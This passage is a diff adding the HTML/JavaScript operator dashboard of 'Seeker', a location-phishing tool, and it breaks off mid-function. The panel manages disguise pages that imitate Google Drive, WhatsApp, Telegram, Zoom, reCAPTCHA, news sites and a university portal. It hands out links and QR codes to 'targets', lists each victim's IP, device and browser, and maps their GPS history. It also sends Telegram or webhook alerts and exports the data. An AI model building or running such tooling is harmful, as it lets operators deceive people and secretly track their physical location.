@@ -1,0 +1,1135 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Seeker 中控面板</title>
+<link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css" />
+<script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"></script>
+<style>
+*{margin:0;padding:0;box-sizing:border-box}
+:root{
+  --bg:#0a0e14;--surface:#111820;--surface2:#1a2230;--border:#1e2a3a;
+  --text:#e0e8f0;--text2:#7a8a9e;--text3:#4a5a6e;
+  --accent:#3b82f6;--accent2:#2563eb;
+  --green:#22c55e;--red:#ef4444;--yellow:#eab308;--purple:#a855f7;--cyan:#06b6d4;--orange:#f97316;
+  --radius:8px;--shadow:0 2px 8px rgba(0,0,0,0.3);
+}
+html,body{height:100%;overflow:hidden}
+body{font-family:-apple-system,BlinkMacSystemFont,'PingFang SC','Microsoft YaHei','Segoe UI',sans-serif;background:var(--bg);color:var(--text);font-size:14px}
+::-webkit-scrollbar{width:6px}
+::-webkit-scrollbar-track{background:transparent}
+::-webkit-scrollbar-thumb{background:var(--border);border-radius:3px}
+::-webkit-scrollbar-thumb:hover{background:var(--text3)}
+
+/* Header */
+.header{
+  background:var(--surface);border-bottom:1px solid var(--border);
+  padding:0 20px;height:52px;display:flex;align-items:center;justify-content:space-between;
+  position:relative;z-index:100;
+}
+.header-left{display:flex;align-items:center;gap:16px}
+.logo{display:flex;align-items:center;gap:8px}
+.logo-icon{width:28px;height:28px;background:var(--accent);border-radius:6px;display:flex;align-items:center;justify-content:center;font-size:14px;font-weight:800;color:#fff}
+.logo-text{font-size:16px;font-weight:700;color:var(--text)}
+.logo-text span{color:var(--accent)}
+.header-stats{display:flex;gap:20px;margin-left:24px}
+.stat-item{display:flex;align-items:center;gap:6px;font-size:12px;color:var(--text2)}
+.stat-num{font-size:18px;font-weight:700;color:var(--text);font-family:monospace}
+.stat-num.green{color:var(--green)}
+.stat-num.blue{color:var(--accent)}
+.stat-num.purple{color:var(--purple)}
+.header-right{display:flex;align-items:center;gap:10px}
+.status-dot{width:8px;height:8px;border-radius:50%;background:var(--green);animation:pulse 2s infinite}
+@keyframes pulse{0%,100%{opacity:1}50%{opacity:.4}}
+.status-text{font-size:12px;color:var(--green)}
+.btn{
+  padding:6px 14px;border-radius:6px;border:1px solid var(--border);background:var(--surface2);
+  color:var(--text);font-size:12px;cursor:pointer;display:inline-flex;align-items:center;gap:5px;
+  transition:all .15s;font-family:inherit;
+}
+.btn:hover{background:var(--border);border-color:var(--text3)}
+.btn-primary{background:var(--accent);border-color:var(--accent);color:#fff}
+.btn-primary:hover{background:var(--accent2)}
+.btn-sm{padding:4px 10px;font-size:11px}
+.btn-icon{width:32px;height:32px;padding:0;justify-content:center;border-radius:6px}
+
+/* Main Layout */
+.main{display:grid;grid-template-columns:300px 1fr 360px;height:calc(100vh - 52px)}
+
+/* Left Sidebar */
+.sidebar{background:var(--surface);border-right:1px solid var(--border);display:flex;flex-direction:column}
+.sidebar-header{padding:12px 16px;border-bottom:1px solid var(--border)}
+.sidebar-title{font-size:13px;font-weight:600;color:var(--text2);text-transform:uppercase;letter-spacing:1px;margin-bottom:8px}
+.search-box{position:relative}
+.search-box input{
+  width:100%;padding:7px 10px 7px 32px;background:var(--bg);border:1px solid var(--border);
+  border-radius:6px;color:var(--text);font-size:12px;outline:none;font-family:inherit;
+}
+.search-box input:focus{border-color:var(--accent)}
+.search-box input::placeholder{color:var(--text3)}
+.search-icon{position:absolute;left:10px;top:50%;transform:translateY(-50%);color:var(--text3);font-size:13px}
+.session-list{flex:1;overflow-y:auto}
+.session-item{
+  padding:12px 16px;border-bottom:1px solid var(--border);cursor:pointer;transition:all .15s;
+  border-left:3px solid transparent;
+}
+.session-item:hover{background:rgba(59,130,246,0.06)}
+.session-item.active{background:rgba(59,130,246,0.1);border-left-color:var(--accent)}
+.session-ip{font-size:13px;font-weight:600;font-family:monospace;color:var(--text)}
+.session-meta{font-size:11px;color:var(--text2);margin-top:3px}
+.session-badges{display:flex;gap:4px;margin-top:6px;flex-wrap:wrap}
+.badge{font-size:10px;padding:2px 6px;border-radius:4px;font-weight:500}
+.badge-green{background:rgba(34,197,94,0.15);color:var(--green)}
+.badge-purple{background:rgba(168,85,247,0.15);color:var(--purple)}
+.badge-yellow{background:rgba(234,179,8,0.15);color:var(--yellow)}
+.badge-red{background:rgba(239,68,68,0.15);color:var(--red)}
+.sidebar-footer{padding:10px 16px;border-top:1px solid var(--border);display:flex;gap:8px}
+.sidebar-footer .btn{flex:1;justify-content:center}
+
+/* Center Area */
+.center{display:flex;flex-direction:column;background:var(--bg)}
+.center-tabs{
+  display:flex;background:var(--surface);border-bottom:1px solid var(--border);padding:0 16px;
+}
+.tab{
+  padding:10px 16px;font-size:13px;color:var(--text2);cursor:pointer;
+  border-bottom:2px solid transparent;transition:all .15s;display:flex;align-items:center;gap:5px;
+}
+.tab:hover{color:var(--text)}
+.tab.active{color:var(--accent);border-bottom-color:var(--accent)}
+.tab-icon{font-size:14px}
+.center-content{flex:1;position:relative}
+.tab-panel{position:absolute;inset:0;display:none;overflow:auto}
+.tab-panel.active{display:block}
+
+/* Map */
+#map{width:100%;height:100%}
+.map-overlay{
+  position:absolute;top:12px;left:12px;z-index:1000;
+  background:rgba(17,24,32,0.92);border:1px solid var(--border);border-radius:var(--radius);
+  padding:10px 14px;font-size:12px;color:var(--text2);backdrop-filter:blur(8px);
+}
+.map-overlay .count{color:var(--accent);font-weight:700}
+.map-controls{
+  position:absolute;bottom:16px;right:16px;z-index:1000;display:flex;gap:6px;
+}
+.map-controls .btn{box-shadow:var(--shadow)}
+
+/* Template Grid */
+.tpl-panel{padding:20px}
+.tpl-header{margin-bottom:20px}
+.tpl-header h2{font-size:18px;font-weight:700;margin-bottom:4px}
+.tpl-header p{font-size:13px;color:var(--text2)}
+.tpl-current{
+  background:linear-gradient(135deg,rgba(59,130,246,0.1),rgba(59,130,246,0.05));
+  border:1px solid rgba(59,130,246,0.3);border-radius:var(--radius);padding:16px;
+  margin-bottom:24px;display:flex;align-items:center;justify-content:space-between;
+}
+.tpl-current-info{display:flex;align-items:center;gap:12px}
+.tpl-current-icon{width:44px;height:44px;background:var(--accent);border-radius:10px;display:flex;align-items:center;justify-content:center;font-size:20px}
+.tpl-current-name{font-size:16px;font-weight:700}
+.tpl-current-desc{font-size:12px;color:var(--text2);margin-top:2px}
+.tpl-grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(280px,1fr));gap:12px}
+.tpl-card{
+  background:var(--surface);border:1px solid var(--border);border-radius:var(--radius);
+  padding:16px;cursor:pointer;transition:all .2s;position:relative;overflow:hidden;
+}
+.tpl-card:hover{border-color:var(--accent);transform:translateY(-2px);box-shadow:0 4px 16px rgba(0,0,0,0.3)}
+.tpl-card.active{border-color:var(--green);background:rgba(34,197,94,0.05)}
+.tpl-card.active::after{
+  content:'当前使用';position:absolute;top:10px;right:10px;
+  font-size:10px;padding:2px 8px;background:var(--green);color:#fff;border-radius:4px;font-weight:600;
+}
+.tpl-card-header{display:flex;align-items:center;gap:10px;margin-bottom:10px}
+.tpl-card-icon{width:36px;height:36px;border-radius:8px;display:flex;align-items:center;justify-content:center;font-size:18px;flex-shrink:0}
+.tpl-card-name{font-size:14px;font-weight:600}
+.tpl-card-id{font-size:11px;color:var(--text3);font-family:monospace}
+.tpl-card-desc{font-size:12px;color:var(--text2);line-height:1.5;margin-bottom:10px}
+.tpl-card-footer{display:flex;align-items:center;justify-content:space-between}
+.tpl-card-tags{display:flex;gap:4px}
+.tpl-tag{font-size:10px;padding:2px 6px;border-radius:3px;background:var(--surface2);color:var(--text2)}
+
+/* Log Panel */
+.log-panel{padding:16px;display:flex;flex-direction:column;height:100%}
+.log-toolbar{display:flex;gap:8px;margin-bottom:12px;align-items:center}
+.log-filter{
+  padding:6px 10px;background:var(--bg);border:1px solid var(--border);border-radius:6px;
+  color:var(--text);font-size:12px;outline:none;font-family:inherit;
+}
+.log-filter option{background:var(--surface)}
+.log-count{font-size:12px;color:var(--text2);margin-left:auto}
+.log-list{flex:1;overflow-y:auto;font-family:'SF Mono',Monaco,Consolas,monospace;font-size:12px}
+.log-entry{padding:6px 10px;border-bottom:1px solid rgba(30,42,58,0.5);display:flex;gap:10px;align-items:flex-start}
+.log-entry:hover{background:rgba(59,130,246,0.04)}
+.log-time{color:var(--text3);white-space:nowrap;min-width:80px}
+.log-type{font-size:10px;padding:1px 5px;border-radius:3px;white-space:nowrap;font-weight:600;min-width:50px;text-align:center}
+.log-type-info{background:rgba(59,130,246,0.15);color:var(--accent)}
+.log-type-loc{background:rgba(168,85,247,0.15);color:var(--purple)}
+.log-type-err{background:rgba(239,68,68,0.15);color:var(--red)}
+.log-type-warn{background:rgba(234,179,8,0.15);color:var(--yellow)}
+.log-msg{color:var(--text);word-break:break-all}
+
+/* Settings Panel */
+.settings-panel{padding:20px;max-width:700px}
+.settings-section{margin-bottom:24px}
+.settings-section h3{font-size:14px;font-weight:600;margin-bottom:12px;padding-bottom:8px;border-bottom:1px solid var(--border);display:flex;align-items:center;gap:6px}
+.settings-row{display:flex;align-items:center;justify-content:space-between;padding:10px 0;border-bottom:1px solid rgba(30,42,58,0.3)}
+.settings-label{font-size:13px;color:var(--text2)}
+.settings-value{font-size:13px;font-family:monospace;color:var(--text)}
+.settings-input{
+  padding:6px 10px;background:var(--bg);border:1px solid var(--border);border-radius:6px;
+  color:var(--text);font-size:12px;outline:none;width:300px;font-family:inherit;
+}
+.settings-input:focus{border-color:var(--accent)}
+
+/* Right Panel */
+.right-panel{background:var(--surface);border-left:1px solid var(--border);display:flex;flex-direction:column;overflow:hidden}
+.right-header{padding:12px 16px;border-bottom:1px solid var(--border);display:flex;align-items:center;justify-content:space-between}
+.right-title{font-size:13px;font-weight:600;color:var(--text2)}
+.right-body{flex:1;overflow-y:auto}
+.detail-section{padding:14px 16px;border-bottom:1px solid var(--border)}
+.detail-title{font-size:11px;color:var(--text3);text-transform:uppercase;letter-spacing:1px;margin-bottom:10px;display:flex;align-items:center;gap:5px}
+.info-grid{display:grid;grid-template-columns:1fr 1fr;gap:6px}
+.info-card{background:var(--bg);border:1px solid var(--border);border-radius:6px;padding:8px 10px}
+.info-label{font-size:10px;color:var(--text3);margin-bottom:3px}
+.info-value{font-size:12px;font-weight:500;font-family:monospace;word-break:break-all;color:var(--text)}
+.loc-table{width:100%;font-size:12px}
+.loc-table td{padding:3px 0}
+.loc-table .lbl{color:var(--text2);width:70px}
+.loc-table .val{font-family:monospace;color:var(--text)}
+.gmaps-btn{
+  display:inline-flex;align-items:center;gap:4px;margin-top:8px;padding:6px 12px;
+  background:var(--accent);color:#fff;border-radius:6px;text-decoration:none;
+  font-size:11px;font-weight:600;transition:all .15s;
+}
+.gmaps-btn:hover{background:var(--accent2)}
+.empty-state{text-align:center;padding:40px 20px;color:var(--text3)}
+.empty-icon{font-size:36px;margin-bottom:8px}
+.empty-text{font-size:13px}
+
+/* Stats Cards */
+.stats-grid{display:grid;grid-template-columns:repeat(4,1fr);gap:12px;padding:16px;border-bottom:1px solid var(--border)}
+.stats-card{background:var(--bg);border:1px solid var(--border);border-radius:var(--radius);padding:14px;text-align:center}
+.stats-card-num{font-size:24px;font-weight:800;font-family:monospace}
+.stats-card-label{font-size:11px;color:var(--text2);margin-top:4px}
+
+/* Modal */
+.modal-overlay{
+  position:fixed;inset:0;background:rgba(0,0,0,0.6);z-index:2000;
+  display:none;align-items:center;justify-content:center;backdrop-filter:blur(4px);
+}
+.modal-overlay.show{display:flex}
+.modal{
+  background:var(--surface);border:1px solid var(--border);border-radius:12px;
+  padding:24px;max-width:480px;width:90%;box-shadow:0 20px 60px rgba(0,0,0,0.5);
+}
+.modal h3{font-size:16px;margin-bottom:12px}
+.modal p{font-size:13px;color:var(--text2);margin-bottom:16px}
+.modal-actions{display:flex;gap:8px;justify-content:flex-end}
+.qr-area{text-align:center;padding:16px;background:#fff;border-radius:8px;margin:12px 0}
+
+/* Toast */
+.toast{
+  position:fixed;top:16px;right:16px;z-index:3000;
+  background:var(--surface2);border:1px solid var(--border);border-radius:var(--radius);
+  padding:10px 16px;font-size:13px;color:var(--text);box-shadow:var(--shadow);
+  transform:translateX(120%);transition:transform .3s ease;
+}
+.toast.show{transform:translateX(0)}
+.toast.success{border-color:var(--green);color:var(--green)}
+.toast.error{border-color:var(--red);color:var(--red)}
+
+/* Responsive */
+@media(max-width:1200px){.main{grid-template-columns:260px 1fr 320px}}
+@media(max-width:900px){
+  .main{grid-template-columns:1fr}
+  .sidebar,.right-panel{display:none}
+  .header-stats{display:none}
+}
+</style>
+</head>
+<body>
+
+<!-- Header -->
+<div class="header">
+  <div class="header-left">
+    <div class="logo">
+      <div class="logo-icon">S</div>
+      <div class="logo-text"><span>Seeker</span> 中控面板</div>
+    </div>
+    <div class="header-stats">
+      <div class="stat-item">
+        <div>
+          <div class="stat-num blue" id="hTotalSessions">0</div>
+          <div style="font-size:10px">会话总数</div>
+        </div>
+      </div>
+      <div class="stat-item">
+        <div>
+          <div class="stat-num green" id="hWithLocation">0</div>
+          <div style="font-size:10px">已定位</div>
+        </div>
+      </div>
+      <div class="stat-item">
+        <div>
+          <div class="stat-num purple" id="hLocationUpdates">0</div>
+          <div style="font-size:10px">位置更新</div>
+        </div>
+      </div>
+    </div>
+  </div>
+  <div class="header-right">
+    <span class="status-dot"></span>
+    <span class="status-text" id="hStatus">运行中</span>
+    <span style="color:var(--text3);font-size:11px" id="hLastUpdate">-</span>
+    <button class="btn btn-sm" onclick="copyLink()" title="复制目标链接">
+      &#128279; 复制链接
+    </button>
+    <button class="btn btn-sm" onclick="showQR()" title="显示二维码">
+      &#9638; 二维码
+    </button>
+    <button class="btn btn-sm btn-primary" onclick="exportData()" title="导出数据">
+      &#128190; 导出
+    </button>
+  </div>
+</div>
+
+<!-- Main -->
+<div class="main">
+  <!-- Left: Session List -->
+  <div class="sidebar">
+    <div class="sidebar-header">
+      <div class="sidebar-title">已捕获会话</div>
+      <div class="search-box">
+        <span class="search-icon">&#128269;</span>
+        <input type="text" id="sessionSearch" placeholder="搜索 IP / 系统 / 浏览器..." oninput="renderSessionList()">
+      </div>
+    </div>
+    <div class="session-list" id="sessionList"></div>
+    <div class="sidebar-footer">
+      <button class="btn btn-sm" onclick="selectSession(-1);renderDetail(-1)">
+        &#128200; 统计总览
+      </button>
+      <button class="btn btn-sm" onclick="clearSelection()">
+        &#128260; 刷新
+      </button>
+    </div>
+  </div>
+
+  <!-- Center -->
+  <div class="center">
+    <div class="center-tabs">
+      <div class="tab active" data-tab="map" onclick="switchTab('map')">
+        <span class="tab-icon">&#127758;</span> 地图
+      </div>
+      <div class="tab" data-tab="templates" onclick="switchTab('templates')">
+        <span class="tab-icon">&#127912;</span> 伪装页面
+      </div>
+      <div class="tab" data-tab="logs" onclick="switchTab('logs')">
+        <span class="tab-icon">&#128196;</span> 日志
+      </div>
+      <div class="tab" data-tab="settings" onclick="switchTab('settings')">
+        <span class="tab-icon">&#9881;</span> 设置
+      </div>
+    </div>
+    <div class="center-content">
+      <!-- Map Tab -->
+      <div class="tab-panel active" id="panel-map">
+        <div id="map"></div>
+        <div class="map-overlay" id="mapOverlay">
+          共 <span class="count" id="mapCount">0</span> 个定位点 | 点击左侧会话查看位置
+        </div>
+        <div class="map-controls">
+          <button class="btn btn-sm" onclick="fitAllMarkers()" title="显示所有标记">&#128506; 全部</button>
+          <button class="btn btn-sm" onclick="toggleHeatmap()" title="切换热力图">&#128293; 热力</button>
+        </div>
+      </div>
+
+      <!-- Templates Tab -->
+      <div class="tab-panel" id="panel-templates">
+        <div class="tpl-panel">
+          <div class="tpl-header">
+            <h2>&#127912; 伪装页面管理</h2>
+            <p>选择一个伪装页面作为目标访问时显示的页面</p>
+          </div>
+          <div class="tpl-current" id="tplCurrent">
+            <div class="tpl-current-info">
+              <div class="tpl-current-icon" id="tplCurrentIcon">&#128196;</div>
+              <div>
+                <div class="tpl-current-name" id="tplCurrentName">加载中...</div>
+                <div class="tpl-current-desc" id="tplCurrentDesc">-</div>
+              </div>
+            </div>
+            <span class="badge badge-green">当前使用</span>
+          </div>
+          <div class="tpl-grid" id="tplGrid"></div>
+        </div>
+      </div>
+
+      <!-- Logs Tab -->
+      <div class="tab-panel" id="panel-logs">
+        <div class="log-panel">
+          <div class="log-toolbar">
+            <select class="log-filter" id="logFilter" onchange="renderLogs()">
+              <option value="all">全部日志</option>
+              <option value="info">设备信息</option>
+              <option value="loc">位置数据</option>
+              <option value="err">错误信息</option>
+            </select>
+            <button class="btn btn-sm" onclick="clearLogs()">&#128465; 清空</button>
+            <span class="log-count" id="logCount">0 条记录</span>
+          </div>
+          <div class="log-list" id="logList"></div>
+        </div>
+      </div>
+
+      <!-- Settings Tab -->
+      <div class="tab-panel" id="panel-settings">
+        <div class="settings-panel">
+          <div class="settings-section">
+            <h3>&#9881; 基本设置</h3>
+            <div class="settings-row">
+              <span class="settings-label">跳转链接</span>
+              <input class="settings-input" id="setRedirect" placeholder="https://..." value="">
+            </div>
+            <div class="settings-row">
+              <span class="settings-label">服务端口</span>
+              <span class="settings-value" id="setPort">8080</span>
+            </div>
+            <div class="settings-row">
+              <span class="settings-label">隧道类型</span>
+              <span class="settings-value" id="setTunnel">-</span>
+            </div>
+            <div class="settings-row">
+              <span class="settings-label">本地地址</span>
+              <span class="settings-value" id="setLocalUrl">-</span>
+            </div>
+            <div class="settings-row">
+              <span class="settings-label">公网地址</span>
+              <span class="settings-value" id="setPublicUrl">-</span>
+            </div>
+          </div>
+          <div class="settings-section">
+            <h3>&#128276; 通知设置</h3>
+            <div class="settings-row">
+              <span class="settings-label">Telegram Bot</span>
+              <input class="settings-input" id="setTelegram" placeholder="token:chatId" value="">
+            </div>
+            <div class="settings-row">
+              <span class="settings-label">Webhook URL</span>
+              <input class="settings-input" id="setWebhook" placeholder="https://..." value="">
+            </div>
+          </div>
+          <div class="settings-section">
+            <h3>&#128190; 数据管理</h3>
+            <div class="settings-row">
+              <span class="settings-label">导出 CSV 数据</span>
+              <button class="btn btn-sm" onclick="exportData()">导出</button>
+            </div>
+            <div class="settings-row">
+              <span class="settings-label">导出 KML 文件</span>
+              <button class="btn btn-sm" onclick="exportKML()">导出</button>
+            </div>
+            <div class="settings-row">
+              <span class="settings-label">清空所有会话</span>
+              <button class="btn btn-sm" style="color:var(--red);border-color:var(--red)" onclick="confirmClear()">清空</button>
+            </div>
+          </div>
+          <div class="settings-section">
+            <h3>&#128221; 系统信息</h3>
+            <div class="settings-row">
+              <span class="settings-label">版本</span>
+              <span class="settings-value">2.0.0 (Improved)</span>
+            </div>
+            <div class="settings-row">
+              <span class="settings-label">Python</span>
+              <span class="settings-value" id="setPython">-</span>
+            </div>
+            <div class="settings-row">
+              <span class="settings-label">运行时间</span>
+              <span class="settings-value" id="setUptime">-</span>
+            </div>
+          </div>
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <!-- Right: Detail Panel -->
+  <div class="right-panel">
+    <div class="right-header">
+      <span class="right-title" id="rightTitle">会话详情</span>
+      <span style="font-size:11px;color:var(--text3)" id="rightTime"></span>
+    </div>
+    <div class="right-body">
+      <!-- Stats overview (shown when no session selected) -->
+      <div id="statsView">
+        <div class="stats-grid">
+          <div class="stats-card">
+            <div class="stats-card-num" style="color:var(--accent)" id="sTotal">0</div>
+            <div class="stats-card-label">总会话数</div>
+          </div>
+          <div class="stats-card">
+            <div class="stats-card-num" style="color:var(--green)" id="sLocated">0</div>
+            <div class="stats-card-label">已获取位置</div>
+          </div>
+          <div class="stats-card">
+            <div class="stats-card-num" style="color:var(--purple)" id="sUpdates">0</div>
+            <div class="stats-card-label">位置更新</div>
+          </div>
+          <div class="stats-card">
+            <div class="stats-card-num" style="color:var(--red)" id="sErrors">0</div>
+            <div class="stats-card-label">定位失败</div>
+          </div>
+        </div>
+        <div class="detail-section">
+          <div class="detail-title">&#128202; 系统分布</div>
+          <div id="osStats"></div>
+        </div>
+        <div class="detail-section">
+          <div class="detail-title">&#128240; 浏览器分布</div>
+          <div id="browserStats"></div>
+        </div>
+        <div class="detail-section">
+          <div class="detail-title">&#127758; 最近活动</div>
+          <div id="recentActivity"></div>
+        </div>
+      </div>
+
+      <!-- Session detail (shown when session selected) -->
+      <div id="sessionDetail" style="display:none">
+        <div class="detail-section">
+          <div class="detail-title">&#128187; 设备信息</div>
+          <div class="info-grid" id="devInfo"></div>
+        </div>
+        <div class="detail-section">
+          <div class="detail-title">&#127760; 网络信息</div>
+          <div class="info-grid" id="netInfo"></div>
+        </div>
+        <div class="detail-section">
+          <div class="detail-title">&#128205; 位置信息</div>
+          <div id="locInfo"></div>
+        </div>
+        <div class="detail-section">
+          <div class="detail-title">&#128197; 位置历史</div>
+          <div id="locHistory"></div>
+        </div>
+        <div class="detail-section">
+          <div class="detail-title">&#128221; 事件日志</div>
+          <div id="sessionLog" style="font-family:monospace;font-size:11px;max-height:200px;overflow-y:auto"></div>
+        </div>
+      </div>
+    </div>
+  </div>
+</div>
+
+<!-- QR Modal -->
+<div class="modal-overlay" id="qrModal">
+  <div class="modal">
+    <h3>&#9638; 目标链接二维码</h3>
+    <p>目标扫描此二维码即可访问伪装页面</p>
+    <div class="qr-area" id="qrArea"></div>
+    <div class="modal-actions">
+      <button class="btn" onclick="closeModal('qrModal')">关闭</button>
+      <button class="btn btn-primary" onclick="copyLink()">&#128279; 复制链接</button>
+    </div>
+  </div>
+</div>
+
+<!-- Toast -->
+<div class="toast" id="toast"></div>
+
+<script>
+// ===== State =====
+let sessions = [];
+let selectedIndex = -1;
+let markers = {};
+let map, markerGroup;
+let eventLogs = [];
+let startTime = Date.now();
+let currentTemplate = '';
+let templates = [];
+
+// ===== Template definitions =====
+const TEMPLATE_META = [
+  { idx:0, name:'NearYou', dir:'nearyou', icon:'&#128205;', color:'#3b82f6', desc:'附近的人 - 基于位置的社交页面', tags:['社交','位置'] },
+  { idx:1, name:'Google Drive', dir:'gdrive', icon:'&#128194;', color:'#22c55e', desc:'Google Drive 文件分享页面', tags:['云存储','文件'] },
+  { idx:2, name:'WhatsApp', dir:'whatsapp', icon:'&#128172;', color:'#25d366', desc:'WhatsApp Web 聊天界面', tags:['聊天','即时通讯'] },
+  { idx:3, name:'WhatsApp Redirect', dir:'whatsapp_redirect', icon:'&#128172;', color:'#25d366', desc:'WhatsApp 跳转确认页面', tags:['聊天','跳转'] },
+  { idx:4, name:'Telegram', dir:'telegram', icon:'&#128172;', color:'#0088cc', desc:'Telegram Web 聊天界面', tags:['聊天','即时通讯'] },
+  { idx:5, name:'Zoom', dir:'zoom', icon:'&#127909;', color:'#2d8cff', desc:'Zoom 会议加入页面', tags:['视频','会议'] },
+  { idx:6, name:'Google ReCaptcha', dir:'captcha', icon:'&#128272;', color:'#f97316', desc:'Google 人机验证页面', tags:['验证','安全'] },
+  { idx:7, name:'Custom Link Preview', dir:'custom_og_tags', icon:'&#128279;', color:'#a855f7', desc:'自定义链接预览页面', tags:['自定义','预览'] },
+  { idx:8, name:'突发新闻', dir:'news_breaking', icon:'&#128240;', color:'#ef4444', desc:'突发新闻报道页面 - 网络安全主题', tags:['新闻','中文','高仿真'] },
+  { idx:9, name:'本地资讯', dir:'news_local', icon:'&#127961;', color:'#22c55e', desc:'本地天气交通资讯页面 - 生活服务', tags:['新闻','本地','高仿真'] },
+  { idx:10, name:'校园门户', dir:'university', icon:'&#127891;', color:'#1a3c6e', desc:'高校校园信息门户 - 模拟大学官网', tags:['教育','高校','高仿真'] },
+];
+
+// ===== Init Map =====
+function initMap() {
+  map = L.map('map', { zoomControl: false, attributionControl: true }).setView([35, 105], 4);
+  L.tileLayer('https://{s}.basemaps.cartocdn.com/dark_all/{z}/{x}/{y}{r}.png', {
+    attribution: '&copy; OSM &copy; CARTO',
+    maxZoom: 19
+  }).addTo(map);
+  L.control.zoom({ position: 'bottomright' }).addTo(map);
+  markerGroup = L.featureGroup().addTo(map);
+}
+
+// ===== Tabs =====
+function switchTab(name) {
+  document.querySelectorAll('.tab').forEach(t => t.classList.toggle('active', t.dataset.tab === name));
+  document.querySelectorAll('.tab-panel').forEach(p => p.classList.toggle('active', p.id === 'panel-' + name));
+  if (name === 'map') setTimeout(() => map.invalidateSize(), 100);
+}
+
+// ===== Fetch Sessions =====
+async function fetchSessions() {
+  try {
+    const resp = await fetch('/api/sessions');
+    if (!resp.ok) return;
+    const data = await resp.json();
+    const prevLen = sessions.length;
+    sessions = data;
+
+    // Generate event logs
+    if (sessions.length > prevLen) {
+      for (let i = prevLen; i < sessions.length; i++) {
+        addLog('info', `新会话: ${sessions[i].ip}`);
+      }
+    }
+
+    updateStats();
+    renderSessionList();
+    updateMap();
+    renderLogs();
+
+    if (selectedIndex >= 0 && selectedIndex < sessions.length) {
+      renderDetail(selectedIndex);
+    } else if (selectedIndex < 0) {
+      renderStatsView();
+    }
+
+    document.getElementById('hLastUpdate').textContent = new Date().toLocaleTimeString('zh-CN');
+  } catch(e) { console.error('Fetch error:', e); }
+}
+
+// ===== Stats =====
+function updateStats() {
+  const total = sessions.length;
+  const located = sessions.filter(s => s.locations && s.locations.some(l => l.status === 'success')).length;
+  const updates = sessions.reduce((sum, s) => sum + (s.locations ? s.locations.filter(l => l.status === 'success').length : 0), 0);
+  const errors = sessions.reduce((sum, s) => sum + (s.locations ? s.locations.filter(l => l.status !== 'success').length : 0), 0);
+
+  document.getElementById('hTotalSessions').textContent = total;
+  document.getElementById('hWithLocation').textContent = located;
+  document.getElementById('hLocationUpdates').textContent = updates;
+  document.getElementById('sTotal').textContent = total;
+  document.getElementById('sLocated').textContent = located;
+  document.getElementById('sUpdates').textContent = updates;
+  document.getElementById('sErrors').textContent = errors;
+}
+
+// ===== Session List =====
+function renderSessionList() {
+  const container = document.getElementById('sessionList');
+  const query = (document.getElementById('sessionSearch').value || '').toLowerCase();
+
+  let filtered = sessions;
+  if (query) {
+    filtered = sessions.filter(s => {
+      const info = s.info || {};
+      return (s.ip || '').toLowerCase().includes(query) ||
+             (info.os || '').toLowerCase().includes(query) ||
+             (info.browser || '').toLowerCase().includes(query) ||
+             (info.platform || '').toLowerCase().includes(query);
+    });
+  }
+
+  if (filtered.length === 0) {
+    container.innerHTML = '<div class="empty-state"><div class="empty-icon">&#128225;</div><div class="empty-text">' +
+      (query ? '无匹配结果' : '等待目标连接...') + '</div></div>';
+    return;
+  }
+
+  container.innerHTML = filtered.map((s, i) => {
+    const realIdx = sessions.indexOf(s);
+    const info = s.info || {};
+    const locs = s.locations || [];
+    const successLocs = locs.filter(l => l.status === 'success');
+    const os = info.os || '未知系统';
+    const browser = info.browser || '未知浏览器';
+    const time = new Date(s.first_seen * 1000).toLocaleTimeString('zh-CN', {hour:'2-digit',minute:'2-digit'});
+
+    return `<div class="session-item${realIdx === selectedIndex ? ' active' : ''}" onclick="selectSession(${realIdx})">
+      <div class="session-ip">${s.ip}</div>
+      <div class="session-meta">${os} / ${browser} / ${time}</div>
+      <div class="session-badges">
+        ${successLocs.length > 0 ? `<span class="badge badge-purple">&#128205; ${successLocs.length} 次定位</span>` : ''}
+        ${locs.length > 0 && successLocs.length === 0 ? '<span class="badge badge-red">定位失败</span>' : ''}
+        ${!info.os ? '<span class="badge badge-yellow">等待信息</span>' : ''}
+      </div>
+    </div>`;
+  }).join('');
+}
+
+// ===== Select Session =====
+function selectSession(index) {
+  selectedIndex = index;
+  renderSessionList();
+  if (index >= 0) {
+    renderDetail(index);
+    focusOnSession(index);
+  } else {
+    renderStatsView();
+  }
+}
+
+function clearSelection() {
+  selectedIndex = -1;
+  renderSessionList();
+  renderStatsView();
+  fetchSessions();
+}
+
+function focusOnSession(index) {
+  const s = sessions[index];
+  if (!s) return;
+  const locs = (s.locations || []).filter(l => l.status === 'success' && l.lat && l.lon);
+  if (locs.length > 0) {
+    const last = locs[locs.length - 1];
+    const lat = parseFloat(last.lat);
+    const lon = parseFloat(last.lon);
+    if (!isNaN(lat) && !isNaN(lon)) {
+      map.setView([lat, lon], 15, { animate: true });
+      if (markers[s.ip]) markers[s.ip].openPopup();
+    }
+  }
+}
+
+// ===== Map =====
+function updateMap() {
+  markerGroup.clearLayers();
+  markers = {};
+
+  sessions.forEach((s, i) => {
+    const locs = (s.locations || []).filter(l => l.status === 'success' && l.lat && l.lon);
+    if (locs.length === 0) return;
+
+    const last = locs[locs.length - 1];
+    const lat = parseFloat(last.lat);
+    const lon = parseFloat(last.lon);
+    if (isNaN(lat) || isNaN(lon)) return;
+
+    const isSelected = i === selectedIndex;
+    const icon = L.divIcon({
+      className: '',
+      html: `<div style="width:${isSelected?16:12}px;height:${isSelected?16:12}px;border-radius:50%;background:${isSelected?'var(--accent)':'var(--red)'};border:2px solid #fff;box-shadow:0 0 8px rgba(0,0,0,0.5)"></div>`,
+      iconSize: [isSelected?16:12, isSelected?16:12],
+      iconAnchor: [isSelected?8:6, isSelected?8:6]
+    });
+
+    const marker = L.marker([lat, lon], { icon }).addTo(markerGroup);
+    const info = s.info || {};
+    marker.bindPopup(`<div style="font-size:12px;line-height:1.6">
+      <b>${s.ip}</b><br>
+      ${info.os || '未知'} / ${info.browser || '未知'}<br>
+      纬度: ${lat.toFixed(6)}<br>
+      经度: ${lon.toFixed(6)}<br>
+      精度: ${last.acc || 'N/A'}
+    </div>`);
+    markers[s.ip] = marker;
+
+    if (locs.length > 1) {
+      const coords = locs.map(l => [parseFloat(l.lat), parseFloat(l.lon)]);
+      L.polyline(coords, { color: '#3b82f6', weight: 2, opacity: 0.4, dashArray: '5,5' }).addTo(markerGroup);
